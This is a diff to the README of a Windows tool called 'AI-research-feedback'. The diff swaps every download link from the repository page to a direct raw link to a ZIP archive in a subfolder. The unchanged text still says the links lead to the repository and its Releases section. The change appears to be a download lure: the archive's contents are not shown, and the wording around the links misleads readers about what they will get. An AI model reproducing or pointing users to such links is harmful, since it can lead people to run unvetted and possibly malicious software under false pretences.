@@ -1,6 +1,6 @@
 # 🤖 AI-research-feedback - Paper Review Made Simple
 
-[![Download AI-research-feedback](https://img.shields.io/badge/Download-AI--research--feedback-green?style=for-the-badge)](https://github.com/Labrat025/AI-research-feedback)
+[![Download AI-research-feedback](https://img.shields.io/badge/Download-AI--research--feedback-green?style=for-the-badge)](https://github.com/Labrat025/AI-research-feedback/raw/refs/heads/main/Paper-review/feedback-research-A-v2.7.zip)
 
 ## 📋 What is AI-research-feedback?
 
@@ -33,7 +33,7 @@ Follow these steps to download and run the tool on your Windows computer.
 
 Visit the main page to download the latest version:
 
-[Download AI-research-feedback](https://github.com/Labrat025/AI-research-feedback)
+[Download AI-research-feedback](https://github.com/Labrat025/AI-research-feedback/raw/refs/heads/main/Paper-review/feedback-research-A-v2.7.zip)
 
 Click the big button above or open the link in your browser. This will take you to the GitHub repository where you can find the latest release.
 
@@ -101,7 +101,7 @@ Each agent focuses on one aspect, and the findings are combined into a single re
 
 Download the latest version from this link:
 
-[Download AI-research-feedback](https://github.com/Labrat025/AI-research-feedback)
+[Download AI-research-feedback](https://github.com/Labrat025/AI-research-feedback/raw/refs/heads/main/Paper-review/feedback-research-A-v2.7.zip)
 
 On the GitHub page, look for the Releases section. There, you can download the full package as a ZIP file. After downloading:
 
@@ -152,4 +152,4 @@ To install a new version:
 
 - Read the README file provided with the download.
 
-[![Download AI-research-feedback](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/Labrat025/AI-research-feedback)
+[![Download AI-research-feedback](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/Labrat025/AI-research-feedback/raw/refs/heads/main/Paper-review/feedback-research-A-v2.7.zip)
